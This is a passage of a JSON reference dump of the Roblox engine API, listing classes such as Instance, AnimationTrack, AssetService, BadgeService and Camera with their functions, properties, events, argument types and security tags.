name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"FindFirstChild","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"scopeLength","Default":"4"}],"Name":"GetDebugId","tags":["PluginSecurity","notbrowsable"],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetFullName","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"IsA","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"descendant","Default":null}],"Name":"IsAncestorOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"IsDescendantOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"children","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"clone","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"destroy","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"findFirstChild","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getChildren","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"isA","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"isDescendantOf","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"childName","Default":null}],"Name":"WaitForChild","tags":[],"Class":"Instance","type":"YieldFunction"},{"Arguments":[{"Name":"child","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"AncestryChanged","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"property","Type":"Property"}],"Name":"Changed","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildRemoved","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantRemoving","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"childAdded","tags":["deprecated"],"Class":"Instance","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Accoutrement","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AttachmentForward","tags":[],"Class":"Accoutrement"},{"ValueType":"CoordinateFrame","type":"Property","Name":"AttachmentPoint","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentPos","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentRight","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentUp","tags":[],"Class":"Accoutrement"},{"Superclass":"Accoutrement","type":"Class","Name":"Accessory","tags":[]},{"Superclass":"Accoutrement","type":"Class","Name":"Hat","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"AdService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ShowVideoAd","tags":[],"Class":"AdService","type":"Function"},{"Arguments":[{"Name":"adShown","Type":"bool"}],"Name":"VideoAdClosed","tags":[],"Class":"AdService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AdvancedDragger","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animation","tags":[]},{"ValueType":"Content","type":"Property","Name":"AnimationId","tags":[],"Class":"Animation"},{"Superclass":"Instance","type":"Class","Name":"AnimationController","tags":[]},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"AnimationController","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"AnimationController","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"AnimationController","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrack","tags":[]},{"ValueType":"Object","type":"Property","Name":"Animation","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"Length","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"TimePosition","tags":[],"Class":"AnimationTrack"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"speed","Default":"1"}],"Name":"AdjustSpeed","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"AdjustWeight","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"keyframeName","Default":null}],"Name":"GetTimeOfKeyframe","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"},{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"speed","Default":"1"}],"Name":"Play","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"Stop","tags":[],"Class":"AnimationTrack","type":"Function"},{"Arguments":[{"Name":"keyframeName","Type":"string"}],"Name":"KeyframeReached","tags":[],"Class":"AnimationTrack","type":"Event"},{"Arguments":[],"Name":"Stopped","tags":["deprecated"],"Class":"AnimationTrack","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrackState","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animator","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Animator","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"AssetService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"revertUrl","Default":null}],"Name":"SetAssetRevertUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"versionsUrl","Default":null}],"Name":"SetAssetVersionsUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"accessUrl","Default":null}],"Name":"SetPlaceAccessUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceInPlayerInventoryAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"pageNum","Default":"1"}],"Name":"GetAssetVersions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"creationID","Default":null}],"Name":"GetCreatorAssetID","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGamePlacesAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"versionNumber","Default":null}],"Name":"RevertAsset","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"void","Arguments":[],"Name":"SavePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"AccessType","Name":"accessType","Default":"Everyone"},{"Type":"Array","Name":"inviteList","Default":"{}"}],"Name":"SetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Attachment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Axis","tags":[],"Class":"Attachment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"SecondaryAxis","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldAxis","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldPosition","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldRotation","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldSecondaryAxis","tags":["readonly"],"Class":"Attachment"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"BadgeService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAwardBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"seconds","Default":null}],"Name":"SetHasBadgeCooldown","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetHasBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeDisabledUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeLegalUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceId","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"AwardBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsDisabled","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsLegal","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"UserHasBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"userId","Type":"int"},{"Name":"badgeId","Type":"int"}],"Name":"BadgeAwarded","tags":["RobloxScriptSecurity"],"Class":"BadgeService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BasePlayerGui","tags":[]},{"Superclass":"BasePlayerGui","type":"Class","Name":"CoreGui","tags":["notCreatable","notbrowsable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":["RobloxScriptSecurity"],"Class":"CoreGui"},{"ValueType":"int","type":"Property","Name":"Version","tags":["readonly"],"Class":"CoreGui"},{"Superclass":"BasePlayerGui","type":"Class","Name":"PlayerGui","tags":["notCreatable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"PlayerGui"},{"ReturnType":"float","Arguments":[],"Name":"GetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"transparency","Default":null}],"Name":"SetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"Arguments":[{"Name":"transparency","Type":"float"}],"Name":"TopbarTransparencyChangedSignal","tags":[],"Class":"PlayerGui","type":"Event"},{"Superclass":"BasePlayerGui","type":"Class","Name":"StarterGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"ResetPlayerGuiOnSpawn","tags":[],"Class":"StarterGui"},{"ValueType":"bool","type":"Property","Name":"ShowDevelopmentGui","tags":[],"Class":"StarterGui"},{"ReturnType":"bool","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null}],"Name":"GetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"getFunction","Default":null}],"Name":"RegisterGetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"setFunction","Default":null}],"Name":"RegisterSetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetCore","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"parameterName","Default":null}],"Name":"GetCore","tags":[],"Class":"StarterGui","type":"YieldFunction"},{"Arguments":[{"Name":"coreGuiType","Type":"CoreGuiType"},{"Name":"enabled","Type":"bool"}],"Name":"CoreGuiChangedSignal","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BinaryStringValue","tags":[]},{"Superclass":"Instance","type":"Class","Name":"BindableEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Fire","tags":[],"Class":"BindableEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"Event","tags":[],"Class":"BindableEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BindableFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Invoke","tags":[],"Class":"BindableFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnInvoke","tags":[],"Class":"BindableFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"BodyMover","tags":[]},{"Superclass":"BodyMover","type":"Class","Name":"BodyAngularVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AngularVelocity","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"angularvelocity","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"Superclass":"BodyMover","type":"Class","Name":"BodyForce","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyForce"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyForce"},{"Superclass":"BodyMover","type":"Class","Name":"BodyGyro","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyGyro"},{"ValueType":"CoordinateFrame","type":"Property","Name":"cframe","tags":["deprecated"],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyGyro"},{"Superclass":"BodyMover","type":"Class","Name":"BodyPosition","tags":[]},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyPosition"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"position","tags":["deprecated"],"Class":"BodyPosition"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyPosition","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":["deprecated"],"Class":"BodyPosition","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"BodyPosition","type":"Event"},{"Superclass":"BodyMover","type":"Class","Name":"BodyThrust","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"Location","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"location","tags":["deprecated"],"Class":"BodyThrust"},{"Superclass":"BodyMover","type":"Class","Name":"BodyVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"velocity","tags":["deprecated"],"Class":"BodyVelocity"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"Superclass":"BodyMover","type":"Class","Name":"RocketPropulsion","tags":[]},{"ValueType":"float","type":"Property","Name":"CartoonFactor","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxThrust","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Object","type":"Property","Name":"Target","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"TargetOffset","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TargetRadius","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustP","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnP","tags":[],"Class":"RocketPropulsion"},{"ReturnType":"void","Arguments":[],"Name":"Abort","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Fire","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"fire","tags":["deprecated"],"Class":"RocketPropulsion","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"RocketPropulsion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BoolValue","tags":[]},{"ValueType":"bool","type":"Property","Name":"Value","tags":[],"Class":"BoolValue"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"Changed","tags":[],"Class":"BoolValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"changed","tags":["deprecated"],"Class":"BoolValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BrickColorValue","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Value","tags":[],"Class":"BrickColorValue"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"Changed","tags":[],"Class":"BrickColorValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"changed","tags":["deprecated"],"Class":"BrickColorValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Button","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"active","Default":null}],"Name":"SetActive","tags":["PluginSecurity"],"Class":"Button","type":"Function"},{"Arguments":[],"Name":"Click","tags":["PluginSecurity"],"Class":"Button","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CFrameValue","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Value","tags":[],"Class":"CFrameValue"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"Changed","tags":[],"Class":"CFrameValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"changed","tags":["deprecated"],"Class":"CFrameValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CacheableContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"MeshContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"SolidModelContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"TextureContentProvider","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Camera","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Camera"},{"ValueType":"Object","type":"Property","Name":"CameraSubject","tags":[],"Class":"Camera"},{"ValueType":"CameraType","type":"Property","Name":"CameraType","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","hidden"],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"FieldOfView","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Focus","tags":[],"Class":"Camera"},{"ValueType":"bool","type":"Property","Name":"HeadLocked","tags":[],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"HeadScale","tags":[],"Class":"Camera"},{"ValueType":"Vector2","type":"Property","Name":"ViewportSize","tags":["readonly"],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"focus","tags":["deprecated"],"Class":"Camera"},{"ReturnType":"float","Arguments":[],"Name":"GetPanSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetTiltSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"endPos","Default":null},{"Type":"CoordinateFrame","Name":"endFocus","Default":null},{"Type":"float","Name":"duration","Default":null}],"Name":"Interpolate","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"PanUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ScreenPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CameraPanMode","Name":"mode","Default":"Classic"}],"Name":"SetCameraPanMode","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"rollAngle","Default":null}],"Name":"SetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"TiltUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ViewportPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToScreenPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToViewportPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"float","Name":"distance","Default":null}],"Name":"Zoom","tags":["RobloxScriptSecurity"],"Class":"Camera","type":"Function"},{"Arguments":[{"Name":"entering","Type":"bool"}],"Name":"FirstPersonTransition","tags":["RobloxPlaceSecurity"],"Class":"Camera","type":"Event"},{"Arguments":[],"Name":"InterpolationFinished","tags":[],"Class":"Camera","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChangeHistoryService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Redo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetWaypoints","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"state","Default":null}],"Name":"SetEnabled","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"SetWaypoint","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Undo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CharacterAppearance","tags":[]},{"Superclass":"CharacterAppearance","type":"Class","Name":"BodyColors","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"HeadColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"TorsoColor","tags":[],"Class":"BodyColors"},{"Superclass":"CharacterAppearance","type":"Class","Name":"CharacterMesh","tags":[]},{"ValueType":"int","type":"Property","Name":"BaseTextureId","tags":[],"Class":"CharacterMesh"},{"ValueType":"BodyPart","type":"Property","Name":"BodyPart","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"MeshId","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"OverlayTextureId","tags":[],"Class":"CharacterMesh"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Clothing","tags":[]},{"Superclass":"Clothing","type":"Class","Name":"Pants","tags":[]},{"ValueType":"Content","type":"Property","Name":"PantsTemplate","tags":[],"Class":"Pants"},{"Superclass":"Clothing","type":"Class","Name":"Shirt","tags":[]},{"ValueType":"Content","type":"Property","Name":"ShirtTemplate","tags":[],"Class":"Shirt"},{"Superclass":"CharacterAppearance","type":"Class","Name":"ShirtGr